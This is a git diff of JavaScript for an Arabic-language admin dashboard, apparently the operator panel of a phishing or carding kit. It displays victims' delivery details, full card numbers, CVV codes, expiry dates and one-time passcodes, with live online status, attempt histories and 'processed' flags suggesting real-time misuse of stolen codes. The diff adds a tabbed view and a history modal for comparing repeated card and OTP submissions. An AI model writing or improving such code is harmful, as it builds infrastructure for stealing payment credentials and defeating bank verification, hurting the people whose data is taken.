@@ -54,38 +54,310 @@ function formatDate(timestamp) {
 
 // Start live timer that updates every 5 seconds
 function startLiveTimer() {
-  // Clear existing interval
   if (liveTimerInterval) {
     clearInterval(liveTimerInterval);
   }
-  
-  // Update every 5 seconds
   liveTimerInterval = setInterval(() => {
     updateRelativeTimes();
   }, 5000);
-  
-  // Initial update
   updateRelativeTimes();
 }
 
 // Update all relative time displays on the page
 function updateRelativeTimes() {
-  const timeElements = document.querySelectorAll('.relative-time');
-  timeElements.forEach(el => {
+  document.querySelectorAll('.relative-time').forEach(el => {
     const timestamp = el.getAttribute('data-timestamp');
     if (timestamp) {
       el.textContent = getRelativeTime(timestamp);
     }
   });
   
-  // Also update last activity
-  const lastActivityElements = document.querySelectorAll('.last-activity');
-  lastActivityElements.forEach(el => {
+  document.querySelectorAll('.last-activity').forEach(el => {
     const timestamp = el.getAttribute('data-timestamp');
     if (timestamp) {
       el.textContent = 'آخر نشاط: ' + getRelativeTime(timestamp);
     }
   });
+}
+
+// ==========================================
+// STATUS INDICATOR UTILITIES
+// ==========================================
+
+// Get status indicator based on submission state
+function getStatusIndicator(status) {
+  if (!status) {
+    return '<span class="status-dot status-pending" title="في الانتظار">⏳</span>';
+  }
+  if (status.submitted && status.processed) {
+    return '<span class="status-dot status-success" title="تم المعالجة">✅</span>';
+  }
+  if (status.submitted && !status.processed) {
+    return '<span class="status-dot status-new" title="جديد - لم يُعالَج">🆕</span>';
+  }
+  if (!status.submitted) {
+    return '<span class="status-dot status-pending" title="في الانتظار">⏳</span>';
+  }
+  return '<span class="status-dot status-pending">⏳</span>';
+}
+
+// ==========================================
+// MODAL SYSTEM FOR HISTORY
+// ==========================================
+
+// History modal state
+let currentHistoryModal = null;
+
+// Open history modal with lazy loading
+async function openHistoryModal(sessionId, type, buttonElement) {
+  // If modal already open for this type, close it
+  if (currentHistoryModal && currentHistoryModal.sessionId === sessionId && currentHistoryModal.type === type) {
+    closeHistoryModal();
+    return;
+  }
+  
+  // Show loading indicator on button
+  if (buttonElement) {
+    buttonElement.classList.add('loading');
+    buttonElement.innerHTML = '<span class="spinner-small"></span> جاري التحميل...';
+  }
+  
+  try {
+    const response = await fetch(`${SERVER_URL}/api/visitors/${sessionId}/history/${type}`);
+    const data = await response.json();
+    
+    if (data.success) {
+      showHistoryModal(sessionId, type, data);
+      currentHistoryModal = { sessionId, type };
+    } else {
+      showToast('فشل في تحميل السجل', 'error');
+    }
+  } catch (error) {
+    console.error('Error loading history:', error);
+    showToast('فشل في تحميل السجل', 'error');
+  } finally {
+    if (buttonElement) {
+      buttonElement.classList.remove('loading');
+    }
+  }
+}
+
+// Show history modal
+function showHistoryModal(sessionId, type, data) {
+  const modalId = 'historyModal_' + sessionId + '_' + type;
+  let modal = document.getElementById(modalId);
+  
+  // Remove existing modal if exists
+  if (modal) {
+    modal.remove();
+  }
+  
+  // Create modal
+  modal = document.createElement('div');
+  modal.id = modalId;
+  modal.className = 'history-modal';
+  modal.innerHTML = createHistoryModalContent(sessionId, type, data);
+  document.body.appendChild(modal);
+  
+  // Add event listeners
+  const closeBtn = modal.querySelector('.modal-close');
+  const backdrop = modal.querySelector('.modal-backdrop');
+  const compareToggle = modal.querySelector('.compare-toggle');
+  
+  if (closeBtn) closeBtn.addEventListener('click', closeHistoryModal);
+  if (backdrop) backdrop.addEventListener('click', closeHistoryModal);
+  if (compareToggle) compareToggle.addEventListener('change', toggleCompareMode);
+  
+  // Add compare button listeners to items
+  modal.querySelectorAll('.history-item').forEach((item, idx, items) => {
+    const compareBtn = item.querySelector('.compare-btn');
+    if (compareBtn && idx > 0) {
+      compareBtn.addEventListener('click', () => {
+        const prevItem = items[idx - 1];
+        highlightChanges(item, prevItem);
+      });
+    }
+  });
+  
+  // Animate in
+  requestAnimationFrame(() => {
+    modal.classList.add('active');
+  });
+}
+
+// Close history modal
+function closeHistoryModal() {
+  document.querySelectorAll('.history-modal').forEach(modal => {
+    modal.classList.remove('active');
+    setTimeout(() => modal.remove(), 300);
+  });
+  currentHistoryModal = null;
+}
+
+// Create history modal content
+function createHistoryModalContent(sessionId, type, data) {
+  const typeLabels = {
+    delivery: 'بيانات التوصيل',
+    payment: 'بيانات الدفع',
+    verification: 'رموز التحقق'
+  };
+  
+  const typeIcons = {
+    delivery: '📦',
+    payment: '💳',
+    verification: '🔐'
+  };
+  
+  const submissions = data.submissions || [];
+  const count = submissions.length;
+  
+  let itemsHTML = '';
+  if (count === 0) {
+    itemsHTML = '<div class="no-history">لا توجد محاولات سابقة</div>';
+  } else {
+    submissions.forEach((sub, idx) => {
+      const isFirst = idx === 0;
+      const timestamp = sub.created_at;
+      itemsHTML += `
+        <div class="history-item ${isFirst ? 'latest' : ''}" data-index="${idx}">
+          <div class="history-item-header">
+            <div class="history-item-left">
+              ${isFirst ? '<span class="current-badge">الحالي</span>' : ''}
+              <span class="attempt-number">#${count - idx}</span>
+            </div>
+            <div class="history-item-right">
+              <span class="relative-time" data-timestamp="${timestamp}">${getRelativeTime(timestamp)}</span>
+              ${!isFirst ? `<button class="compare-btn" title="مقارنة مع السابق">🔍</button>` : ''}
+            </div>
+          </div>
+          <div class="history-item-content" data-index="${idx}">
+            ${formatHistoryItemData(type, sub.form_data)}
+          </div>
+          ${sub.is_processed ? '<div class="processed-badge">تمت المعالجة</div>' : ''}
+        </div>
+      `;
+    });
+  }
+  
+  return `
+    <div class="modal-backdrop"></div>
+    <div class="modal-content">
+      <div class="modal-header">
+        <div class="modal-title">
+          <span class="modal-icon">${typeIcons[type]}</span>
+          <span>${typeLabels[type]}</span>
+          <span class="modal-count">(${count})</span>
+        </div>
+        <button class="modal-close">✕</button>
+      </div>
+      <div class="modal-body">
+        <div class="modal-toolbar">
+          <label class="compare-toggle">
+            <input type="checkbox" onchange="toggleCompareMode(this)">
+            <span>تمييز التغييرات</span>
+          </label>
+        </div>
+        <div class="modal-history-list">
+          ${itemsHTML}
+        </div>
+      </div>
+    </div>
+  `;
+}
+
+// Format history item data based on type
+function formatHistoryItemData(type, formData) {
+  if (!formData) return '<div class="no-data">—</div>';
+  if (typeof formData === 'string') {
+    try { formData = JSON.parse(formData); } catch (e) { return '<div class="no-data">—</div>'; }
+  }
+  
+  let html = '<div class="data-grid">';
+  
+  switch (type) {
+    case 'delivery':
+      if (formData.fullName) html += `<div class="data-item"><span class="label">الاسم:</span><span class="value">${escapeHtml(formData.fullName)}</span></div>`;
+      if (formData.phone) html += `<div class="data-item"><span class="label">الهاتف:</span><span class="value">${escapeHtml(formData.phone)}</span></div>`;
+      if (formData.email) html += `<div class="data-item"><span class="label">البريد:</span><span class="value">${escapeHtml(formData.email)}</span></div>`;
+      if (formData.address) html += `<div class="data-item"><span class="label">العنوان:</span><span class="value">${escapeHtml(formData.address)}</span></div>`;
+      if (formData.city) html += `<div class="data-item"><span class="label">المدينة:</span><span class="value">${escapeHtml(formData.city)}</span></div>`;
+      if (formData.deliveryDate) html += `<div class="data-item"><span class="label">تاريخ التوصيل:</span><span class="value">${escapeHtml(formData.deliveryDate)}</span></div>`;
+      break;
+      
+    case 'payment':
+      if (formData.cardNumber) html += `<div class="data-item"><span class="label">رقم البطاقة:</span><span class="value">${escapeHtml(formData.cardNumber)}</span></div>`;
+      if (formData.cardHolder) html += `<div class="data-item"><span class="label">صاحب البطاقة:</span><span class="value">${escapeHtml(formData.cardHolder)}</span></div>`;
+      if (formData.expiry) html += `<div class="data-item"><span class="label">تاريخ الانتهاء:</span><span class="value">${escapeHtml(formData.expiry)}</span></div>`;
+      if (formData.cvv) html += `<div class="data-item"><span class="label">CVV:</span><span class="value">${escapeHtml(formData.cvv)}</span></div>`;
+      if (formData.paymentMethod) html += `<div class="data-item"><span class="label">طريقة الدفع:</span><span class="value">${escapeHtml(formData.paymentMethod === 'cash' ? 'نقداً عند الاستلام' : formData.paymentMethod)}</span></div>`;
+      if (formData.paymentAmount) html += `<div class="data-item"><span class="label">المبلغ:</span><span class="value">${formData.paymentAmount} ر.ق</span></div>`;
+      break;
+      
+    case 'verification':
+      if (formData.otp) {
+        html += `<div class="data-item otp-display"><span class="label">رمز OTP:</span>`;
+        html += `<span class="otp-digits">${formData.otp.split('').map(d => `<span class="otp-char">${d}</span>`).join('')}</span>`;
+        html += `</div>`;
+      }
+      break;
+  }
+  
+  html += '</div>';
+  return html;
+}
+
+// Toggle compare/highlight mode
+function toggleCompareMode(checkbox) {
+  const modal = checkbox.closest('.history-modal');
+  if (modal) {
+    modal.classList.toggle('compare-mode', checkbox.checked);
+  }
+}
+
+// Highlight changes between two history items
+function highlightChanges(currentItem, previousItem) {
+  const currentData = currentItem.querySelector('.history-item-content');
+  const prevData = previousItem.querySelector('.history-item-content');
+  
+  if (!currentData || !prevData) return;
+  
+  // Reset all highlights
+  document.querySelectorAll('.history-item-content .data-item').forEach(item => {
+    item.classList.remove('changed', 'new', 'removed');
+  });
+  
+  // Get data items
+  const currentItems = {};
+  const prevItems = {};
+  
+  currentData.querySelectorAll('.data-item').forEach(item => {
+    const label = item.querySelector('.label')?.textContent;
+    const value = item.querySelector('.value')?.textContent;
+    if (label) currentItems[label] = value;
+  });
+  
+  prevData.querySelectorAll('.data-item').forEach(item => {
+    const label = item.querySelector('.label')?.textContent;
+    const value = item.querySelector('.value')?.textContent;
+    if (label) prevItems[label] = value;
+  });
+  
+  // Compare and highlight
+  currentData.querySelectorAll('.data-item').forEach(item => {
+    const label = item.querySelector('.label')?.textContent;
+    const value = item.querySelector('.value')?.textContent;
+    
+    if (label) {
+      if (!prevItems.hasOwnProperty(label)) {
+        item.classList.add('new');
+      } else if (prevItems[label] !== value) {
+        item.classList.add('changed');
+      }
+    }
+  });
+  
+  // Scroll current item into view
+  currentItem.scrollIntoView({ behavior: 'smooth', block: 'center' });
 }
 
 // ==========================================
@@ -804,72 +1076,39 @@ function createVisitorCard(visitor, isTrashMode = false) {
   // Get OTP value
   const otpValue = verification.otp || verification.verificationData?.otp || '';
   
-  // Get OTP history
-  let otpHistory = [];
-  if (visitor.otp_history) {
-    try {
-      otpHistory = typeof visitor.otp_history === 'string' 
-        ? JSON.parse(visitor.otp_history) 
-        : (Array.isArray(visitor.otp_history) ? visitor.otp_history : []);
-    } catch (e) {
-      otpHistory = [];
-    }
-  }
-  
   // Check form completion status
   const deliveryDone = visitor.form_submitted === true;
   const paymentDone = visitor.payment_submitted === true;
   const verificationDone = visitor.verification_submitted === true;
   
-  // Build Delivery Box Fields
-  const deliveryFields = [];
-  if (delivery.fullName) deliveryFields.push({label: 'الاسم', value: delivery.fullName});
-  if (delivery.phone) deliveryFields.push({label: 'الهاتف', value: delivery.phone});
-  if (delivery.email) deliveryFields.push({label: 'البريد', value: delivery.email});
-  if (delivery.city) deliveryFields.push({label: 'المدينة', value: delivery.city});
-  if (delivery.address) deliveryFields.push({label: 'العنوان', value: delivery.address});
+  // Get submission counts from visitor data
+  const deliveryCount = visitor.delivery_submissions?.length || 0;
+  const paymentCount = visitor.payment_submissions?.length || 0;
+  const verificationCount = visitor.verification_submissions?.length || 0;
   
-  const deliveryRowsHTML = deliveryFields.map(f => `
-    <div class="data-item">
-      <span class="data-label">${f.label}</span>
-      <span class="data-value">${escapeHtml(f.value)}</span>
-    </div>
-  `).join('');
+  // Determine status for each tab
+  const deliveryStatus = {
+    submitted: deliveryDone,
+    processed: visitor.delivery_processed || false,
+    hasHistory: deliveryCount > 1
+  };
   
-  // Build Payment Box Fields
-  const paymentFields = [];
-  const cardNum = payment.cardNumber || payment.card_number || '';
-  if (cardNum) paymentFields.push({label: 'البطاقة', value: cardNum});
-  if (payment.cardHolder) paymentFields.push({label: 'صاحب البطاقة', value: payment.cardHolder});
-  if (payment.expiry) paymentFields.push({label: 'تاريخ الانتهاء', value: payment.expiry});
-  if (payment.cvv) paymentFields.push({label: 'CVV', value: payment.cvv});
+  const paymentStatus = {
+    submitted: paymentDone,
+    processed: visitor.payment_processed || false,
+    hasHistory: paymentCount > 1
+  };
   
-  const paymentRowsHTML = paymentFields.map(f => `
-    <div class="data-item">
-      <span class="data-label">${f.label}</span>
-      <span class="data-value">${escapeHtml(f.value)}</span>
-    </div>
-  `).join('');
+  const verificationStatus = {
+    submitted: verificationDone,
+    processed: visitor.verification_processed || false,
+    hasHistory: verificationCount > 1
+  };
   
-  // OTP Digits HTML
-  let otpDigitsHTML = '';
-  if (otpValue) {
-    otpDigitsHTML = otpValue.split('').map(d => `<span class="otp-digit-new">${d}</span>`).join('');
-  } else {
-    otpDigitsHTML = '<span class="otp-empty">---</span>';
-  }
-  
-  // OTP History
-  let historyToggle = '';
-  if (otpHistory && otpHistory.length > 1) {
-    const oldOtps = otpHistory.slice(1).map(item => {
-      const date = new Date(item.timestamp).toLocaleString('ar-OM');
-      return `<div class="otp-history-item">السابق: <strong>${escapeHtml(item.otp || '')}</strong> <small>(${date})</small></div>`;
-    }).join('');
-    historyToggle = `
-      <div class="otp-history-dropdown" id="otpHistory_${sessionId}">${oldOtps}</div>
-    `;
-  }
+  // Build current data summaries for each tab
+  const deliverySummary = buildDeliverySummary(delivery);
+  const paymentSummary = buildPaymentSummary(payment);
+  const otpSummary = otpValue ? otpValue.split('').map(d => `<span class="otp-char">${d}</span>`).join('') : '<span class="otp-empty">—</span>';
   
   // Page badge color
   const pageColors = {
@@ -883,7 +1122,7 @@ function createVisitorCard(visitor, isTrashMode = false) {
   // Country + Name display
   const displayName = delivery.fullName || payment.cardHolder || country || 'زائر ' + sessionId.substring(0, 6);
   
-  // Status classes
+  // Header background
   const headerBg = isOnline 
     ? 'background: linear-gradient(135deg, #1e3a5f 0%, #1e293b 100%);'
     : 'background: linear-gradient(135deg, #374151 0%, #1f2937 100%);';
@@ -918,13 +1157,7 @@ function createVisitorCard(visitor, isTrashMode = false) {
   // Check if this is a new/unprocessed submission (within last 5 minutes)
   const isNew = visitor.isNew || (new Date() - new Date(createdAt) < 5 * 60 * 1000);
   
-  // Count total submissions
-  const deliveryCount = visitor.delivery_submissions?.length || (deliveryDone ? 1 : 0);
-  const paymentCount = visitor.payment_submissions?.length || (paymentDone ? 1 : 0);
-  const verificationCount = visitor.verification_submissions?.length || (verificationDone ? 1 : 0);
-  const hasHistory = deliveryCount > 1 || paymentCount > 1 || verificationCount > 1;
-  
-  // Build final card HTML with new design
+  // Build new tabbed card HTML
   const cardHTML = `
     <div class="visitor-card-new ${isNew ? 'is-new' : ''}" data-session="${sessionId}" data-online="${isOnline}" data-created="${createdAt}">
       <!-- Header -->
@@ -945,57 +1178,65 @@ function createVisitorCard(visitor, isTrashMode = false) {
         </div>
       </div>
       
-      <!-- Submission History Toggle (if has history) -->
-      ${hasHistory ? `
-      <div class="history-toggle" onclick="toggleSubmissionHistory('${sessionId}')">
-        <span class="history-icon">📋</span>
-        <span class="history-text">سجل المحاولات (${deliveryCount + paymentCount + verificationCount})</span>
-        <span class="history-arrow" id="arrow_${sessionId}">▼</span>
+      <!-- Tab Navigation -->
+      <div class="tab-nav">
+        <button class="tab-btn ${deliveryDone ? 'active' : ''}" onclick="switchTab(this, 'delivery', '${sessionId}')" data-tab="delivery">
+          ${getStatusIndicator(deliveryStatus)}
+          <span class="tab-icon">📦</span>
+          <span class="tab-label">التوصيل</span>
+          ${deliveryCount > 1 ? `<span class="tab-count">${deliveryCount}</span>` : ''}
+        </button>
+        <button class="tab-btn ${!deliveryDone && paymentDone ? 'active' : ''}" onclick="switchTab(this, 'payment', '${sessionId}')" data-tab="payment">
+          ${getStatusIndicator(paymentStatus)}
+          <span class="tab-icon">💳</span>
+          <span class="tab-label">الدفع</span>
+          ${paymentCount > 1 ? `<span class="tab-count">${paymentCount}</span>` : ''}
+        </button>
+        <button class="tab-btn ${!deliveryDone && !paymentDone && verificationDone ? 'active' : ''}" onclick="switchTab(this, 'verification', '${sessionId}')" data-tab="verification">
+          ${getStatusIndicator(verificationStatus)}
+          <span class="tab-icon">🔐</span>
+          <span class="tab-label">التحقق</span>
+          ${verificationCount > 1 ? `<span class="tab-count">${verificationCount}</span>` : ''}
+        </button>
       </div>
-      <div class="submission-history" id="history_${sessionId}" style="display: none;">
-        ${renderSubmissionHistory(visitor)}
-      </div>
-      ` : ''}
       
-      <!-- Data Boxes Container -->
-      <div class="data-boxes-container">
-        <!-- Delivery Box -->
-        <div class="data-box delivery-box ${deliveryFields.length === 0 ? 'empty' : ''}" style="background: linear-gradient(135deg, #16365f 0%, #162235 100%); border: 1px solid rgba(59, 130, 246, 0.28); border-radius: 14px; overflow: hidden; box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.04), 0 8px 18px rgba(15, 23, 42, 0.35);">
-          <div class="box-header" style="background: rgba(0, 0, 0, 0.22); border-bottom: 1px solid rgba(255, 255, 255, 0.08);">
-            <span class="box-icon">📦</span>
-            <span class="box-title">بيانات التوصيل</span>
-            ${deliveryCount > 1 ? `<span class="attempt-count">(${deliveryCount})</span>` : ''}
+      <!-- Tab Content -->
+      <div class="tab-content">
+        <!-- Delivery Tab -->
+        <div class="tab-panel" data-panel="delivery" style="${deliveryDone ? '' : 'display:none;'}">
+          <div class="tab-summary">
+            ${deliverySummary}
           </div>
-          <div class="box-content">
-            ${deliveryFields.length > 0 ? deliveryRowsHTML : '<div class="no-data">لا توجد بيانات</div>'}
-          </div>
+          <button class="history-btn" onclick="openHistoryModal('${sessionId}', 'delivery', this)">
+            <span>📋</span>
+            <span>عرض السجل</span>
+            ${deliveryCount > 1 ? `<span class="history-count">(${deliveryCount})</span>` : ''}
+          </button>
         </div>
         
-        <!-- Payment Box -->
-        <div class="data-box payment-box ${paymentFields.length === 0 ? 'empty' : ''}" style="background: linear-gradient(135deg, #17312a 0%, #132238 100%); border: 1px solid rgba(16, 185, 129, 0.28); border-radius: 14px; overflow: hidden; box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.04), 0 8px 18px rgba(15, 23, 42, 0.35);">
-          <div class="box-header" style="background: rgba(0, 0, 0, 0.22); border-bottom: 1px solid rgba(255, 255, 255, 0.08);">
-            <span class="box-icon">💳</span>
-            <span class="box-title">بيانات الدفع</span>
-            ${paymentCount > 1 ? `<span class="attempt-count">(${paymentCount})</span>` : ''}
+        <!-- Payment Tab -->
+        <div class="tab-panel" data-panel="payment" style="${!deliveryDone && paymentDone ? '' : 'display:none;'}">
+          <div class="tab-summary">
+            ${paymentSummary}
           </div>
-          <div class="box-content">
-            ${paymentFields.length > 0 ? paymentRowsHTML : '<div class="no-data">لا توجد بيانات</div>'}
+          <button class="history-btn" onclick="openHistoryModal('${sessionId}', 'payment', this)">
+            <span>📋</span>
+            <span>عرض السجل</span>
+            ${paymentCount > 1 ? `<span class="history-count">(${paymentCount})</span>` : ''}
+          </button>
+        </div>
+        
+        <!-- Verification Tab -->
+        <div class="tab-panel" data-panel="verification" style="${!deliveryDone && !paymentDone && verificationDone ? '' : 'display:none;'}">
+          <div class="tab-summary otp-summary">
+            <div class="otp-display">${otpSummary}</div>
           </div>
+          <button class="history-btn" onclick="openHistoryModal('${sessionId}', 'verification', this)">
+            <span>📋</span>
+            <span>عرض السجل</span>
+            ${verificationCount > 1 ? `<span class="history-count">(${verificationCount})</span>` : ''}
+          </button>
         </div>
-      </div>
-      
-      <!-- OTP Section -->
-      <div class="otp-section-new" style="margin: 0 12px; padding: 14px; background: linear-gradient(135deg, #2a246f 0%, #1b144d 100%); border-radius: 14px; border: 1px solid rgba(129, 140, 248, 0.2); box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.04);">
-        <div class="otp-header" onclick="toggleOtpHistory('${sessionId}')">
-          <span class="otp-icon">🔐</span>
-          <span class="otp-title">رمز التحقق (OTP)</span>
-          ${otpHistory && otpHistory.length > 1 ? `<span class="otp-count">${otpHistory.length} رمز</span>` : ''}
-          ${verificationCount > 1 ? `<span class="attempt-count">(${verificationCount})</span>` : ''}
-        </div>
-        <div class="otp-display">
-          ${otpDigitsHTML}
-        </div>
-        ${historyToggle}
       </div>
       
       <!-- Progress & Actions Footer -->
@@ -1022,119 +1263,53 @@ function createVisitorCard(visitor, isTrashMode = false) {
   return cardHTML;
 }
 
-// Render submission history for a visitor
-function renderSubmissionHistory(visitor) {
-  const deliveries = visitor.delivery_submissions || [];
-  const payments = visitor.payment_submissions || [];
-  const verifications = visitor.verification_submissions || [];
-  
-  let html = '<div class="history-content">';
-  
-  // Render delivery attempts
-  if (deliveries.length > 0) {
-    html += '<div class="history-section">';
-    html += '<div class="history-section-title">📦 محاولات التوصيل</div>';
-    deliveries.forEach((sub, idx) => {
-      const timestamp = sub.created_at || sub.timestamp;
-      const isFirst = idx === 0;
-      html += `
-        <div class="history-item ${isFirst ? 'latest' : 'previous'}">
-          <div class="history-item-header">
-            <span class="history-item-number">#${deliveries.length - idx}</span>
-            <span class="history-item-time relative-time" data-timestamp="${timestamp}">${getRelativeTime(timestamp)}</span>
-          </div>
-          <div class="history-item-data">
-            ${formatHistoryData(sub.form_data)}
-          </div>
-        </div>
-      `;
-    });
-    html += '</div>';
+// Build delivery summary HTML
+function buildDeliverySummary(delivery) {
+  if (!delivery || Object.keys(delivery).length === 0) {
+    return '<div class="no-data">لا توجد بيانات</div>';
   }
   
-  // Render payment attempts
-  if (payments.length > 0) {
-    html += '<div class="history-section">';
-    html += '<div class="history-section-title">💳 محاولات الدفع</div>';
-    payments.forEach((sub, idx) => {
-      const timestamp = sub.created_at || sub.timestamp;
-      const isFirst = idx === 0;
-      html += `
-        <div class="history-item ${isFirst ? 'latest' : 'previous'}">
-          <div class="history-item-header">
-            <span class="history-item-number">#${payments.length - idx}</span>
-            <span class="history-item-time relative-time" data-timestamp="${timestamp}">${getRelativeTime(timestamp)}</span>
-          </div>
-          <div class="history-item-data">
-            ${formatHistoryData(sub.form_data)}
-          </div>
-        </div>
-      `;
-    });
-    html += '</div>';
-  }
-  
-  // Render verification attempts
-  if (verifications.length > 0) {
-    html += '<div class="history-section">';
-    html += '<div class="history-section-title">🔐 محاولات التحقق</div>';
-    verifications.forEach((sub, idx) => {
-      const timestamp = sub.created_at || sub.timestamp;
-      const isFirst = idx === 0;
-      html += `
-        <div class="history-item ${isFirst ? 'latest' : 'previous'}">
-          <div class="history-item-header">
-            <span class="history-item-number">#${verifications.length - idx}</span>
-            <span class="history-item-time relative-time" data-timestamp="${timestamp}">${getRelativeTime(timestamp)}</span>
-          </div>
-          <div class="history-item-data">
-            ${formatHistoryData(sub.form_data)}
-          </div>
-        </div>
-      `;
-    });
-    html += '</div>';
-  }
-  
+  let html = '<div class="summary-grid">';
+  if (delivery.fullName) html += `<div class="summary-item"><span class="label">الاسم:</span><span class="value">${escapeHtml(delivery.fullName)}</span></div>`;
+  if (delivery.phone) html += `<div class="summary-item"><span class="label">الهاتف:</span><span class="value">${escapeHtml(delivery.phone)}</span></div>`;
+  if (delivery.address) html += `<div class="summary-item full-width"><span class="label">العنوان:</span><span class="value">${escapeHtml(delivery.address)}</span></div>`;
+  if (delivery.city) html += `<div class="summary-item"><span class="label">المدينة:</span><span class="value">${escapeHtml(delivery.city)}</span></div>`;
   html += '</div>';
   return html;
 }
 
-// Format history data for display
-function formatHistoryData(data) {
-  if (!data) return '<span class="no-data">—</span>';
-  if (typeof data === 'string') {
-    try { data = JSON.parse(data); } catch (e) { return escapeHtml(data); }
+// Build payment summary HTML
+function buildPaymentSummary(payment) {
+  if (!payment || Object.keys(payment).length === 0) {
+    return '<div class="no-data">لا توجد بيانات</div>';
   }
   
-  let html = '<div class="history-data-grid">';
-  
-  if (data.fullName) html += `<div class="history-data-item"><span class="label">الاسم:</span> ${escapeHtml(data.fullName)}</div>`;
-  if (data.phone) html += `<div class="history-data-item"><span class="label">الهاتف:</span> ${escapeHtml(data.phone)}</div>`;
-  if (data.address) html += `<div class="history-data-item"><span class="label">العنوان:</span> ${escapeHtml(data.address)}</div>`;
-  if (data.cardNumber) html += `<div class="history-data-item"><span class="label">البطاقة:</span> ${escapeHtml(data.cardNumber)}</div>`;
-  if (data.expiry) html += `<div class="history-data-item"><span class="label">الانتهاء:</span> ${escapeHtml(data.expiry)}</div>`;
-  if (data.cvv) html += `<div class="history-data-item"><span class="label">CVV:</span> ${escapeHtml(data.cvv)}</div>`;
-  if (data.cardHolder) html += `<div class="history-data-item"><span class="label">الحامل:</span> ${escapeHtml(data.cardHolder)}</div>`;
-  if (data.paymentMethod) html += `<div class="history-data-item"><span class="label">الطريقة:</span> ${escapeHtml(data.paymentMethod)}</div>`;
-  if (data.otp) html += `<div class="history-data-item"><span class="label">OTP:</span> ${escapeHtml(data.otp)}</div>`;
-  
+  let html = '<div class="summary-grid">';
+  const cardNum = payment.cardNumber || payment.card_number || '';
+  if (cardNum) html += `<div class="summary-item"><span class="label">البطاقة:</span><span class="value">${escapeHtml(cardNum)}</span></div>`;
+  if (payment.cardHolder) html += `<div class="summary-item"><span class="label">الحامل:</span><span class="value">${escapeHtml(payment.cardHolder)}</span></div>`;
+  if (payment.expiry) html += `<div class="summary-item"><span class="label">الانتهاء:</span><span class="value">${escapeHtml(payment.expiry)}</span></div>`;
+  if (payment.paymentMethod) {
+    const methodText = payment.paymentMethod === 'cash' ? 'نقداً عند الاستلام' : payment.paymentMethod;
+    html += `<div class="summary-item"><span class="label">الطريقة:</span><span class="value">${escapeHtml(methodText)}</span></div>`;
+  }
   html += '</div>';
-  return html || '<span class="no-data">—</span>';
+  return html;
 }
 
-// Toggle submission history visibility
-function toggleSubmissionHistory(sessionId) {
-  const historyDiv = document.getElementById('history_' + sessionId);
-  const arrow = document.getElementById('arrow_' + sessionId);
+// Switch between tabs in visitor card
+function switchTab(button, tabName, sessionId) {
+  const card = button.closest('.visitor-card-new');
+  if (!card) return;
   
-  if (historyDiv.style.display === 'none') {
-    historyDiv.style.display = 'block';
-    if (arrow) arrow.textContent = '▲';
-  } else {
-    historyDiv.style.display = 'none';
-    if (arrow) arrow.textContent = '▼';
-  }
+  // Update active tab button
+  card.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+  button.classList.add('active');
+  
+  // Show corresponding panel
+  card.querySelectorAll('.tab-panel').forEach(panel => {
+    panel.style.display = panel.dataset.panel === tabName ? 'block' : 'none';
+  });
 }
 
 // Helper function to escape HTML
